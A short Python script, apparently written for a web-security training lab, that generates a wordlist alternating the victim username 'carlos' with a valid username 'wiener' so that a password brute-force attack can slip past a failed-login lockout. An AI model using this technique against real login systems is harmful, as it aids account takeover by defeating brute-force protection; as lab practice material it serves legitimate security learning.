#!/bin/python #By WafflesExploits
victim_username = 'carlos'
valid_username = 'wiener' #The valid username is always going to be the 2 attempt. So, put the valid password in second as well.
number_of_valid_passwords = 100
Output='output.txt'

file = open(Output, "w+")
for n in range(number_of_valid_passwords*2):
	file.write(victim_username+"\n")
	file.write(valid_username+"\n")
      
file.close()